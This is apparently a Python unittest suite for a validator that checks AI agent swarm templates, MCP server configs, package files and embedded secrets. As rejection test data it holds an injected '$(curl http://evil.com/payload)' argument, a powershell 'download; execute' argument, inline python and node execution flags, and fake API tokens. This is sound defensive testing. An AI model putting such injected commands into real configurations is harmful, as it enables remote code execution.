
import json
import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "scripts"))

try:
    from scripts.migrate_consumer_contract import (
        migrated_agent,
        migrated_mcp_config,
        migrated_skills,
        migrated_workflow,
    )
    from scripts.validate_template import (
        TEMPLATE_FILE_SUFFIXES,
        TEMPLATE_SKILL_FILE_SUFFIXES,
        ValidationReport,
        detect_embedded_secrets,
        validate_agent_payload,
        validate_connector_dependencies,
        validate_connector_integrity,
        validate_knowledge_payload,
        validate_mcp_payload,
        validate_package_file,
        validate_package_tree,
        validate_template,
        validate_workflow_content,
        validate_repository,
        validate_catalog_parity,
        validate_mcp_registry,
        load_tool_manifest_map,
    )
    from scripts.verify_compatibility_lock import generate_lock_data, verify_lockfile
except ImportError:
    from migrate_consumer_contract import (
        migrated_agent,
        migrated_mcp_config,
        migrated_skills,
        migrated_workflow,
    )
    from validate_template import (
        TEMPLATE_FILE_SUFFIXES,
        TEMPLATE_SKILL_FILE_SUFFIXES,
        ValidationReport,
        detect_embedded_secrets,
        validate_agent_payload,
        validate_connector_dependencies,
        validate_connector_integrity,
        validate_knowledge_payload,
        validate_mcp_payload,
        validate_package_file,
        validate_package_tree,
        validate_template,
        validate_workflow_content,
        validate_repository,
        validate_catalog_parity,
        validate_mcp_registry,
        load_tool_manifest_map,
    )
    from verify_compatibility_lock import generate_lock_data, verify_lockfile


class ConsumerContractTests(unittest.TestCase):
    def valid_agent(self):
        return {
            "id": "agent-one",
            "name": "Agent One",
            "role": "Reviewer",
            "department": "Quality",
            "description": "Reviews artifacts.",
            "status": "idle",
            "model_config": {
                "provider": "google",
                "model_id": "gemma4:31b",
                "system_prompt": "Review carefully.",
            },
            "skills": ["read_file"],
            "workflows": ["review"],
            "mcp_tools": [],
            "requires_oversight": False,
        }

    def test_agent_requires_consumer_wire_fields(self):
        agent = self.valid_agent()
        del agent["status"]
        del agent["model_config"]["provider"]
        errors = validate_agent_payload(agent)
        self.assertIn("status must be a non-empty string", errors)
        self.assertIn("model_config.provider must be a non-empty string", errors)

    def test_agent_migration_is_additive_and_idempotent(self):
        source = self.valid_agent()
        source.pop("status")
        source["model_config"].pop("provider")
        source["model_config"].pop("model_id")
        source["custom_extension"] = {"preserved": True}
        once = migrated_agent(source, "gemma4:31b")
        twice = migrated_agent(once, "gemma4:31b")
        self.assertEqual(once, twice)
        self.assertTrue(once["custom_extension"]["preserved"])
        self.assertEqual([], validate_agent_payload(once))

    def test_agent_migrates_native_status_skills_and_oversight(self):
        source = self.valid_agent()
        source["status"] = "ready"
        source["skills"] = ["read_file", "run_command", "write_to_file"]
        source.pop("mcp_tools")
        source.pop("requires_oversight")
        migrated = migrated_agent(source, "gemma4:31b")
        self.assertEqual("idle", migrated["status"])
        self.assertEqual(
            ["read_file", "execute_shell", "shell", "write_file"],
            migrated["skills"],
        )
        self.assertEqual([], migrated["mcp_tools"])
        self.assertTrue(migrated["requires_oversight"])
        self.assertEqual([], validate_agent_payload(migrated))
        self.assertEqual(migrated["skills"], migrated_skills(migrated["skills"]))

    def test_agent_rejects_legacy_or_unprotected_dangerous_capabilities(self):
        agent = self.valid_agent()
        agent["skills"] = ["run_command", "execute_shell"]
        errors = validate_agent_payload(agent)
        self.assertTrue(any("legacy Tadpole capability" in error for error in errors))
        self.assertTrue(any("capability marker" in error for error in errors))
        self.assertTrue(any("require oversight" in error for error in errors))

    def test_agent_rejects_inactive_mcp_declaration_format(self):
        agent = self.valid_agent()
        agent["mcp_tools"] = ["server-only-placeholder"]
        errors = validate_agent_payload(agent)
        self.assertTrue(any("server:tool" in error for error in errors))

    def test_agent_rejects_wildcard_mcp_declarations(self):
        agent = self.valid_agent()
        agent["mcp_tools"] = ["crm:*"]
        errors = validate_agent_payload(agent)
        self.assertTrue(any("wildcards server:* are prohibited" in error for error in errors))

    def test_agent_rejects_incompatible_model_provider_pairings(self):
        agent = self.valid_agent()
        agent["model_config"]["provider"] = "google"
        agent["model_config"]["model_id"] = "llama-3.3-70b-versatile"
        errors = validate_agent_payload(agent)
        self.assertTrue(any("cannot be paired with" in error for error in errors))

    def test_agent_rejects_system_prompt_exceeding_800_chars(self):
        agent = self.valid_agent()
        agent["model_config"]["system_prompt"] = "A" * 801
        errors = validate_agent_payload(agent)
        self.assertTrue(any("exceeds 800 characters" in error for error in errors))

        agent["model_config"]["system_prompt"] = "A" * 800
        errors = validate_agent_payload(agent)
        self.assertEqual([], errors)

    def test_cross_validation_rejects_stale_swarm_agents_array(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            tmproot = Path(tmpdir)
            swarm = {
                "id": "test-swarm",
                "name": "Test Swarm",
                "description": "Test description",
                "company_size": 25,
                "agents": ["stale-agent-id"],
                "roster": [{"id": "agent-one", "path": "agents/agent-one.json"}]
            }
            (tmproot / "swarm.json").write_text(json.dumps(swarm), encoding="utf-8")
            (tmproot / "agents").mkdir()
            agent = self.valid_agent()
            (tmproot / "agents" / "agent-one.json").write_text(json.dumps(agent), encoding="utf-8")
            (tmproot / "workflows").mkdir()
            (tmproot / "workflows" / "review.md").write_text("# Review\n\n## Step 1\nInspect.", encoding="utf-8")
            report = ValidationReport()
            validate_template(tmproot, {"id": "test", "path": "."}, report)
            self.assertTrue(any("swarm agents array does not match roster IDs" in error for error in report.errors))


    def test_cross_validation_rejects_unused_active_mcp_server(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            tmproot = Path(tmpdir)
            swarm = {
                "id": "test-swarm",
                "name": "Test Swarm",
                "description": "Test description",
                "company_size": 25,
                "connector_ids": ["test-server"],
                "roster": [{"id": "agent-one", "path": "agents/agent-one.json"}]
            }
            (tmproot / "swarm.json").write_text(json.dumps(swarm), encoding="utf-8")
            (tmproot / "agents").mkdir()
            agent = self.valid_agent()
            agent["mcp_tools"] = []
            (tmproot / "agents" / "agent-one.json").write_text(json.dumps(agent), encoding="utf-8")
            (tmproot / "workflows").mkdir()
            (tmproot / "workflows" / "review.md").write_text("# Review\n\n## Step 1\nInspect.", encoding="utf-8")
            (tmproot / "mcps.json").write_text(json.dumps({
                "mcpServers": {
                    "test-server": {"command": "python", "args": ["server.py"], "env": {}}
                }
            }), encoding="utf-8")
            report = ValidationReport()
            validate_template(tmproot, {"id": "test", "path": "."}, report)
            self.assertTrue(any("has no authorized agent grants" in error for error in report.errors))

    def test_cross_validation_rejects_dangling_mcp_grants(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            tmproot = Path(tmpdir)
            swarm = {
                "id": "test-swarm",
                "name": "Test Swarm",
                "description": "Test description",
                "company_size": 25,
                "roster": [{"id": "agent-one", "path": "agents/agent-one.json"}]
            }
            (tmproot / "swarm.json").write_text(json.dumps(swarm), encoding="utf-8")
            (tmproot / "agents").mkdir()
            agent = self.valid_agent()
            agent["mcp_tools"] = ["nonexistent-server:some_tool"]
            (tmproot / "agents" / "agent-one.json").write_text(json.dumps(agent), encoding="utf-8")
            (tmproot / "workflows").mkdir()
            (tmproot / "workflows" / "review.md").write_text("# Review\n\n## Step 1\nInspect.", encoding="utf-8")
            (tmproot / "mcps.json").write_text(json.dumps({"mcpServers": {}}), encoding="utf-8")
            report = ValidationReport()
            validate_template(tmproot, {"id": "test", "path": "."}, report)
            self.assertTrue(any("dangling MCP grant" in error for error in report.errors))

    def test_cross_validation_enforces_oversight_on_mutating_mcp_grants(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            tmproot = Path(tmpdir)
            swarm = {
                "id": "test-swarm",
                "name": "Test Swarm",
                "description": "Test description",
                "company_size": 25,
                "connector_ids": ["generic-crm"],
                "roster": [{"id": "agent-one", "path": "agents/agent-one.json"}]
            }
            (tmproot / "swarm.json").write_text(json.dumps(swarm), encoding="utf-8")
            (tmproot / "agents").mkdir()
            agent = self.valid_agent()
            agent["mcp_tools"] = ["generic-crm:update_invoice"]  # mutating write tool
            agent["requires_oversight"] = False
            (tmproot / "agents" / "agent-one.json").write_text(json.dumps(agent), encoding="utf-8")
            (tmproot / "workflows").mkdir()
            (tmproot / "workflows" / "review.md").write_text("# Review\n\n## Step 1\nInspect.", encoding="utf-8")
            (tmproot / "mcp_registry.json").write_text((ROOT / "mcp_registry.json").read_text(encoding="utf-8"), encoding="utf-8")

            report = ValidationReport()
            validate_template(tmproot, {"id": "test-swarm", "path": "."}, report)
            self.assertTrue(any("mutating MCP tool grant 'generic-crm:update_invoice' requires oversight" in err for err in report.errors))

            # Test encoded mcp__server__tool format enforces oversight as well
            agent["mcp_tools"] = ["mcp__generic-crm__update_invoice"]
            (tmproot / "agents" / "agent-one.json").write_text(json.dumps(agent), encoding="utf-8")
            report2 = ValidationReport()
            validate_template(tmproot, {"id": "test-swarm", "path": "."}, report2)
            self.assertTrue(any("mutating MCP tool grant 'mcp__generic-crm__update_invoice' requires oversight" in err for err in report2.errors))

    def test_workflow_accepts_consumer_h2_or_h3_boundaries_and_ignores_fenced_blocks(self):
        self.assertEqual([], validate_workflow_content("# Review\n\n### Inspect\nDo it."))
        self.assertNotEqual([], validate_workflow_content("# Review\n\nDo it."))
        fenced_only = "# Review\n\n```markdown\n## Step 1: Scoping\nInside code block\n```\n"
        self.assertNotEqual([], validate_workflow_content(fenced_only))

    def test_workflow_migration_preserves_numbered_instructions(self):
        source = "# Workflow: Review\n\n1. Inspect the input.\n2. Report findings.\n"
        migrated = migrated_workflow(source)
        self.assertIn("## Step 1\n\nInspect the input.", migrated)
        self.assertIn("## Step 2\n\nReport findings.", migrated)
        self.assertEqual(migrated, migrated_workflow(migrated))

    def test_mcp_contract_requires_root_map(self):
        self.assertNotEqual([], validate_mcp_payload({}))
        migrated = migrated_mcp_config({})
        self.assertEqual({"mcpServers": {}}, migrated)
        self.assertEqual([], validate_mcp_payload(migrated))

    def test_mcp_security_contract_rejects_commands_inline_code_and_credentials(self):
        config = {
            "mcpServers": {
                "unsafe": {
                    "command": "powershell",
                    "args": ["-c", "download; execute"],
                    "env": {"API_TOKEN": "actual-production-token"},
                },
                "injection": {
                    "command": "python",
                    "args": ["$(curl http://evil.com/payload)"],
                    "env": {},
                },
                "var_expansion": {
                    "command": "python",
                    "args": ["${EVIL_VAR}"],
                    "env": {},
                }
            }
        }
        errors = validate_mcp_payload(config)
        self.assertTrue(any("approved executable" in error for error in errors))
        self.assertTrue(any("shell control syntax" in error for error in errors))
        self.assertTrue(any("local-configuration placeholder" in error for error in errors))

        safe = {
            "mcpServers": {
                "reviewed": {
                    "command": "python",
                    "args": ["server.py"],
                    "env": {"API_TOKEN": "CONFIGURE_LOCALLY"},
                }
            }
        }
        self.assertEqual([], validate_mcp_payload(safe))

    def test_mcp_http_transport_validation(self):
        valid_http = {
            "mcpServers": {
                "remote-gateway": {
                    "url": "https://mcp.internal.example.com/v1/sse",
                    "headers": {
                        "Authorization": "${MCP_GATEWAY_TOKEN}",
                        "X-Client-Id": "swarm-node-1",
                    },
                    "protocol_version": "2026-07-28",
                },
                "local-test": {
                    "url": "http://127.0.0.1:8080/mcp",
                    "headers": {
                        "X-Api-Key": "CONFIGURE_LOCALLY",
                    },
                    "protocol_version": "2024-11-05",
                },
            }
        }
        self.assertEqual([], validate_mcp_payload(valid_http))

    def test_mcp_validation_edge_cases_and_rejections(self):
        # Malformed payloads
        self.assertTrue(any("must be a JSON object" in err for err in validate_mcp_payload([])))
        self.assertTrue(any("mcpServers must be an object" in err for err in validate_mcp_payload({"mcpServers": "not-an-object"})))
        self.assertTrue(any("server names must be non-empty" in err for err in validate_mcp_payload({"mcpServers": {"": {}}})))
        self.assertTrue(any("must be an object" in err for err in validate_mcp_payload({"mcpServers": {"server1": "not-an-object"}})))

        # Missing both command and url
        self.assertTrue(
            any("specify either 'command' or 'url'" in err
                for err in validate_mcp_payload({"mcpServers": {"empty": {}}}))
        )
        # Double underscore in server name
        self.assertTrue(
            any("double underscores" in err
                for err in validate_mcp_payload({"mcpServers": {"server__nested": {"url": "https://example.com"}}}))
        )
        # Invalid URL scheme
        self.assertTrue(
            any("http or https scheme" in err
                for err in validate_mcp_payload({"mcpServers": {"bad-url": {"url": "ftp://files.example.com"}}}))
        )
        # Empty header name
        self.assertTrue(
            any("empty header name" in err
                for err in validate_mcp_payload({"mcpServers": {"bad-hdr": {"url": "https://example.com", "headers": {"": "val"}}}}))
        )
        # Invalid header placeholder syntax
        self.assertTrue(
            any("invalid header placeholder" in err
                for err in validate_mcp_payload({"mcpServers": {"bad-var": {"url": "https://example.com", "headers": {"Auth": "${INVALID-VAR!}"}}}}))
        )
        # Sensitive header with raw secret
        self.assertTrue(
            any("local-configuration placeholder" in err
                for err in validate_mcp_payload({"mcpServers": {"bad-sec": {"url": "https://example.com", "headers": {"Authorization": "raw-secret-12345"}}}}))
        )
        # Invalid protocol version
        self.assertTrue(
            any("protocol_version must be one of" in err
                for err in validate_mcp_payload({"mcpServers": {"bad-ver": {"url": "https://example.com", "protocol_version": "3.0.0"}}}))
        )
        # Invalid env variable key name
        self.assertTrue(
            any("invalid environment variable name" in err
                for err in validate_mcp_payload({"mcpServers": {"bad-env": {"command": "python", "args": ["server.py"], "env": {"BAD-NAME": "val"}}}}))
        )
        # Invalid env placeholder
        self.assertTrue(
            any("invalid environment placeholder" in err
                for err in validate_mcp_payload({"mcpServers": {"bad-ph": {"command": "python", "args": ["server.py"], "env": {"SAFE_KEY": "${123-BAD}"}}}}))
        )
        # Inline code execution prohibition
        self.assertTrue(
            any("inline/module execution" in err
                for err in validate_mcp_payload({"mcpServers": {"bad-inline": {"command": "python", "args": ["-c", "print('boom')"]}}}))
        )
        self.assertTrue(
            any("inline execution" in err
                for err in validate_mcp_payload({"mcpServers": {"bad-eval": {"command": "node", "args": ["-e", "process.exit()"]}}}))
        )

    def test_cross_validation_with_http_mcp_servers(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            tmproot = Path(tmpdir)
            swarm = {
                "id": "http-swarm",
                "name": "HTTP Swarm",
                "description": "Test HTTP description",
                "company_size": 25,
                "connector_ids": ["remote-crm"],
                "roster": [{"id": "agent-one", "path": "agents/agent-one.json"}],
            }
            (tmproot / "swarm.json").write_text(json.dumps(swarm), encoding="utf-8")
            (tmproot / "agents").mkdir()
            agent = self.valid_agent()
            agent["mcp_tools"] = ["remote-crm:query_customer"]
            (tmproot / "agents" / "agent-one.json").write_text(json.dumps(agent), encoding="utf-8")
            (tmproot / "workflows").mkdir()
            (tmproot / "workflows" / "review.md").write_text("# Review\n\n## Step 1\nInspect.", encoding="utf-8")
            (tmproot / "mcps.json").write_text(json.dumps({
                "mcpServers": {
                    "remote-crm": {
                        "url": "https://crm.internal.example.com/sse",
                        "headers": {"Authorization": "${CRM_TOKEN}"},
                        "protocol_version": "2026-07-28",
                    }
                }
            }), encoding="utf-8")
            report = ValidationReport()
            validate_template(tmproot, {"id": "http-test", "path": "."}, report)
            self.assertEqual([], report.errors)

    def test_package_security_contract_rejects_binary_types_and_embedded_secrets(self):
        errors = validate_package_file(
            "payload.exe", ".exe", 9, b"MZ\x00payload", TEMPLATE_FILE_SUFFIXES
        )
        errors += validate_package_file(
            "notes.md",
            ".md",
            47,
            ("token: ghp_" + ("a" * 36)).encode(),
            TEMPLATE_FILE_SUFFIXES,
        )
        self.assertTrue(any("prohibited file type" in error for error in errors))
        self.assertTrue(any("likely GitHub token" in error for error in errors))

    def test_template_package_allows_reviewable_source_only_under_skills(self):
        self.assertEqual(
            [],
            validate_package_file(
                "skills/connector.py",
                ".py",
                12,
                b"print('ok')",
                TEMPLATE_SKILL_FILE_SUFFIXES,
            ),
        )
        self.assertNotEqual(
            [],
            validate_package_file(
                "connector.py",
                ".py",
                12,
                b"print('ok')",
                TEMPLATE_FILE_SUFFIXES,
            ),
        )

    def test_secret_detection_does_not_return_secret_material(self):
        findings = detect_embedded_secrets("-----BEGIN PRIVATE KEY-----\nsensitive\n")
        self.assertEqual(["private key"], findings)

    def test_knowledge_requires_text_and_topic(self):
        self.assertEqual([], validate_knowledge_payload([{"text": "Body", "topic": "legal"}]))
        self.assertNotEqual([], validate_knowledge_payload([{"topic": "legal"}]))

    def test_package_tree_isolation_in_temp_directory(self):
        import tempfile

        with tempfile.TemporaryDirectory() as tmpdir:
            tmproot = Path(tmpdir)
            (tmproot / "agents").mkdir()
            (tmproot / "agents" / "agent.json").write_text("{}", encoding="utf-8")
            (tmproot / "skills").mkdir()
            (tmproot / "skills" / "server.py").write_text("print('ok')", encoding="utf-8")

            # Valid tree
            errors = validate_package_tree(tmproot, TEMPLATE_FILE_SUFFIXES, executable_subdir="skills")
            self.assertEqual([], errors)

            # Invalid: python script placed directly outside skills/
            (tmproot / "bad_script.py").write_text("print('bad')", encoding="utf-8")
            errors = validate_package_tree(tmproot, TEMPLATE_FILE_SUFFIXES, executable_subdir="skills")
            self.assertTrue(any("prohibited file type" in error for error in errors))

    def test_connector_dependencies_require_exact_matching_provenance(self):
        import tempfile

        with tempfile.TemporaryDirectory() as tmpdir:
            connector_root = Path(tmpdir)
            (connector_root / "requirements.txt").write_text(
                "mcp==1.29.1\n", encoding="utf-8"
            )
            connector = {
                "dependency_manifest": "requirements.txt",
                "dependency_provenance": [
                    {
                        "package": "mcp",
                        "version": "1.29.1",
                        "artifact": "mcp-1.29.1-py3-none-any.whl",
                        "sha256": "a" * 64,
                        "source": "https://pypi.org/project/mcp/1.29.1/",
                    }
                ],
            }

            self.assertEqual(
                [], validate_connector_dependencies(connector_root, connector)
            )

            (connector_root / "requirements.txt").write_text(
                "mcp>=1.29.1\n", encoding="utf-8"
            )
            errors = validate_connector_dependencies(connector_root, connector)
            self.assertTrue(any("exact package==version" in error for error in errors))
            self.assertTrue(any("exactly match" in error for error in errors))

    def test_connector_integrity_detects_entrypoint_tampering(self):
        import hashlib
        import tempfile

        with tempfile.TemporaryDirectory() as tmpdir:
            connector_root = Path(tmpdir)
            server = connector_root / "server.py"
            server.write_text("print('ready')\n", encoding="utf-8")
            digest = hashlib.sha256(server.read_bytes()).hexdigest()
            connector = {"integrity_hash": f"sha256:{digest}"}

            self.assertEqual([], validate_connector_integrity(connector_root, connector))

            server.write_text("print('changed')\n", encoding="utf-8")
            errors = validate_connector_integrity(connector_root, connector)
            self.assertTrue(any("does not match" in error for error in errors))

    def test_compatibility_lockfile_integrity_and_drift_detection(self):
        self.assertTrue(verify_lockfile())
        lock_data = generate_lock_data()
        self.assertEqual("1.0.0", lock_data["version"])
        self.assertIn("scripts/validate_template.py", lock_data["critical_contract_files"])

    def test_tool_manifest_map_fails_closed_on_corrupted_registry(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            tmproot = Path(tmpdir)
            registry_file = tmproot / "mcp_registry.json"
            registry_file.write_text("{corrupted-json-content", encoding="utf-8")
            with self.assertRaises(ValueError):
                load_tool_manifest_map(tmproot)

    def test_unlisted_agents_trigger_error(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            tmproot = Path(tmpdir)
            swarm = {
                "id": "unlisted-test",
                "name": "Unlisted Test",
                "description": "Test",
                "company_size": 10,
                "roster": [{"id": "agent-one", "path": "agents/agent-one.json"}],
            }
            (tmproot / "swarm.json").write_text(json.dumps(swarm), encoding="utf-8")
            (tmproot / "agents").mkdir()
            (tmproot / "agents" / "agent-one.json").write_text(json.dumps(self.valid_agent()), encoding="utf-8")
            backdoor = self.valid_agent()
            backdoor["id"] = "backdoor-agent"
            (tmproot / "agents" / "backdoor.json").write_text(json.dumps(backdoor), encoding="utf-8")
            (tmproot / "workflows").mkdir()
            (tmproot / "workflows" / "test.md").write_text("# Test\n\n## Step 1\nRun.", encoding="utf-8")
            report = ValidationReport()
            validate_template(tmproot, {"id": "unlisted-test", "path": "."}, report)
            self.assertTrue(any("unlisted agents in agents/ directory are not registered in swarm.json roster" in err for err in report.errors))

    def test_secret_detection_covers_expanded_api_tokens(self):
        cases = [
            ("sk-proj-" + "A" * 50, "OpenAI API key"),
            ("sk-ant-" + "B" * 42, "Anthropic API key"),
            ("npm_" + "C" * 36, "npm token"),
            ("pypi-AgEIcHlwaS5vcmc" + "D" * 55, "PyPI token"),
            ("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozGzV6Wnonv", "JWT token"),
        ]
        for token, expected_label in cases:
            findings = detect_embedded_secrets(f"KEY = {token}\n")
            self.assertIn(expected_label, findings)

    def test_quarantine_directory_checks_file_size_and_embedded_secrets(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            tmproot = Path(tmpdir)
            quarantine_dir = tmproot / "quarantine"
            quarantine_dir.mkdir()
            # Non-JSON file in quarantine must be rejected
            (quarantine_dir / "backdoor.sh").write_text("#!/bin/bash\necho hi", encoding="utf-8")
            errors = validate_package_tree(tmproot, TEMPLATE_FILE_SUFFIXES)
            self.assertTrue(any("quarantined file must be JSON format" in err for err in errors))

            # Secret in quarantined JSON must be detected
            (quarantine_dir / "backdoor.sh").unlink()
            (quarantine_dir / "leaked_secret.json").write_text(
                json.dumps({"token": "AKIAIOSFODNN7EXAMPLE"}), encoding="utf-8"
            )
            errors = validate_package_tree(tmproot, TEMPLATE_FILE_SUFFIXES)
            self.assertTrue(any("AWS access key" in err for err in errors))

    def test_unknown_tool_grant_on_registered_connector_is_rejected(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            tmproot = Path(tmpdir)
            swarm = {
                "id": "unknown-tool-test",
                "name": "Unknown Tool Test",
                "description": "Test",
                "company_size": 10,
                "connector_ids": ["generic-crm"],
                "roster": [{"id": "agent-one", "path": "agents/agent-one.json"}],
            }
            (tmproot / "swarm.json").write_text(json.dumps(swarm), encoding="utf-8")
            (tmproot / "agents").mkdir()
            agent = self.valid_agent()
            agent["mcp_tools"] = ["generic-crm:drop_everything"]
            agent["requires_oversight"] = True
            (tmproot / "agents" / "agent-one.json").write_text(json.dumps(agent), encoding="utf-8")
            (tmproot / "workflows").mkdir()
            (tmproot / "workflows" / "test.md").write_text("# Test\n\n## Step 1\nRun.", encoding="utf-8")
            (tmproot / "mcps.json").write_text(
                json.dumps({"mcpServers": {"generic-crm": {"command": "python", "args": ["server.py"]}}}),
                encoding="utf-8",
            )
            (tmproot / "mcp_registry.json").write_text((ROOT / "mcp_registry.json").read_text(encoding="utf-8"), encoding="utf-8")
            report = ValidationReport()
            validate_template(tmproot, {"id": "unknown-tool-test", "path": "."}, report)
            self.assertTrue(
                any("unknown MCP tool grant 'generic-crm:drop_everything': tool is not declared by connector 'generic-crm'" in err for err in report.errors)
            )

    def test_connector_ids_element_validation(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            tmproot = Path(tmpdir)
            swarm = {
                "id": "cid-test",
                "name": "CID Test",
                "description": "Test",
                "company_size": 10,
                "connector_ids": ["valid-connector", "", "  "],
                "roster": [{"id": "agent-one", "path": "agents/agent-one.json"}],
            }
            (tmproot / "swarm.json").write_text(json.dumps(swarm), encoding="utf-8")
            (tmproot / "agents").mkdir()
            (tmproot / "agents" / "agent-one.json").write_text(json.dumps(self.valid_agent()), encoding="utf-8")
            (tmproot / "workflows").mkdir()
            (tmproot / "workflows" / "test.md").write_text("# Test\n\n## Step 1\nRun.", encoding="utf-8")
            report = ValidationReport()
            validate_template(tmproot, {"id": "cid-test", "path": "."}, report)
            self.assertTrue(any("swarm.json connector_ids[1] must be a non-empty string" in err for err in report.errors))

    def test_validate_repository_catches_corrupted_manifest_gracefully(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            tmproot = Path(tmpdir)
            (tmproot / "registry.json").write_text("[]", encoding="utf-8")
            (tmproot / "index.json").write_text("[]", encoding="utf-8")
            (tmproot / "mcp_registry.json").write_text("{corrupt-json", encoding="utf-8")
            report = validate_repository(tmproot)
            self.assertTrue(any("cannot parse tool manifest" in err for err in report.errors))

    def test_validate_mcp_payload_handles_missing_and_non_list_args_without_crashing(self):
        # E1 / G1 characterization: missing args key
        res1 = validate_mcp_payload({"mcpServers": {"x": {"command": "python"}}})
        self.assertIn("mcpServers.x.args must be an array of strings", res1)

        # Non-list args
        res2 = validate_mcp_payload({"mcpServers": {"x": {"command": "python", "args": "not-a-list"}}})
        self.assertIn("mcpServers.x.args must be an array of strings", res2)

        # None args
        res3 = validate_mcp_payload({"mcpServers": {"x": {"command": "python", "args": None}}})
        self.assertIn("mcpServers.x.args must be an array of strings", res3)

    def test_root_catalog_secret_scanning_detects_credentials(self):
        # E4 / G4 characterization
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            tmproot = Path(tmpdir)
            (tmproot / "registry.json").write_text(json.dumps([{"token": "ghp_" + "a" * 36}]), encoding="utf-8")
            (tmproot / "index.json").write_text("[]", encoding="utf-8")
            (tmproot / "mcp_registry.json").write_text(json.dumps({"version": "2.0.0", "connectors": []}), encoding="utf-8")
            report = validate_repository(tmproot)
            self.assertTrue(any("registry.json: contains likely GitHub token" in err for err in report.errors))

    def test_embedded_connector_config_is_validated(self):
        # E4: embedded connector config invalidity
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            tmproot = Path(tmpdir)
            connector_dir = tmproot / "conn"
            connector_dir.mkdir()
            (connector_dir / "server.py").write_text("print('ok')", encoding="utf-8")
            import hashlib
            digest = hashlib.sha256(b"print('ok')").hexdigest()
            (connector_dir / "requirements.txt").write_text("mcp==1.29.1\n", encoding="utf-8")
            (connector_dir / "mcps.json").write_text(json.dumps({
                "mcpServers": {"test": {"command": "python", "args": ["server.py"]}}
            }), encoding="utf-8")

            bad_mcp_registry = {
                "version": "2.0.0",
                "connectors": [{
                    "id": "mcp-test",
                    "status": "verified",
                    "path": "conn",
                    "integrity_hash": f"sha256:{digest}",
                    "dependency_manifest": "requirements.txt",
                    "dependency_provenance": [{
                        "package": "mcp", "version": "1.29.1",
                        "artifact": "mcp-1.29.1.whl", "sha256": "a" * 64,
                        "source": "https://pypi.org/project/mcp/1.29.1/"
                    }],
                    "tools": [{
                        "id": "test:tool1", "name": "tool1", "description": "desc", "risk": "read"
                    }],
                    "config": {
                        "mcpServers": {
                            "test": {
                                "command": "python",
                                "args": ["server.py"],
                                "env": {"SECRET_KEY": "unmasked_real_secret_value"}
                            }
                        }
                    }
                }]
            }
            (tmproot / "mcp_registry.json").write_text(json.dumps(bad_mcp_registry), encoding="utf-8")
            report = ValidationReport()
            validate_mcp_registry(tmproot, report)
            self.assertTrue(any("must be an explicit local-configuration placeholder" in err for err in report.errors))

    def test_catalog_parity_handles_malformed_entries_safely(self):
        # E6: non-string path or id in registry.json / index.json
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            tmproot = Path(tmpdir)
            (tmproot / "registry.json").write_text(json.dumps({
                "templates": [{"id": "t1", "path": ["bad", "path"]}]
            }), encoding="utf-8")
            (tmproot / "index.json").write_text(json.dumps([
                {"id": 123, "path": "good/path"}
            ]), encoding="utf-8")
            report = ValidationReport()
            validate_catalog_parity(tmproot, report)
            self.assertTrue(any("registry.json: entry[0].path must be a non-empty string" in err for err in report.errors))
            self.assertTrue(any("index.json: entry[0].id must be a non-empty string" in err for err in report.errors))

    def test_swarm_name_is_required(self):
        # E15: missing swarm name
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            tmproot = Path(tmpdir)
            swarm = {
                "id": "no-name-swarm",
                "description": "Test mission",
                "roster": [],
            }
            (tmproot / "swarm.json").write_text(json.dumps(swarm), encoding="utf-8")
            report = ValidationReport()
            validate_template(tmproot, {"id": "no-name-swarm", "path": "."}, report)
            self.assertTrue(any("swarm.json requires a non-empty name" in err for err in report.errors))

    def test_okf_playbook_workflow_reference_emits_single_clean_error(self):
        # E12: OKF playbook name referenced as workflow emits single specific error
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            tmproot = Path(tmpdir)
            swarm = {
                "id": "okf-test",
                "name": "OKF Test",
                "description": "Test",
                "roster": [{"id": "agent-one", "path": "agents/agent-one.json"}],
            }
            (tmproot / "swarm.json").write_text(json.dumps(swarm), encoding="utf-8")
            (tmproot / "agents").mkdir()
            agent = self.valid_agent()
            agent["workflows"] = ["Full Funnel SEO"]
            (tmproot / "agents" / "agent-one.json").write_text(json.dumps(agent), encoding="utf-8")
            (tmproot / "knowledge").mkdir()
            (tmproot / "knowledge" / "Full Funnel SEO.md").write_text("# Knowledge", encoding="utf-8")
            report = ValidationReport()
            validate_template(tmproot, {"id": "okf-test", "path": "."}, report)
            self.assertTrue(any("agent cannot reference OKF playbook 'Full Funnel SEO' as an executable workflow" in err for err in report.errors))
            self.assertFalse(any("workflow does not exist: workflows/Full Funnel SEO.md" in err for err in report.errors))


if __name__ == "__main__":
    unittest.main()
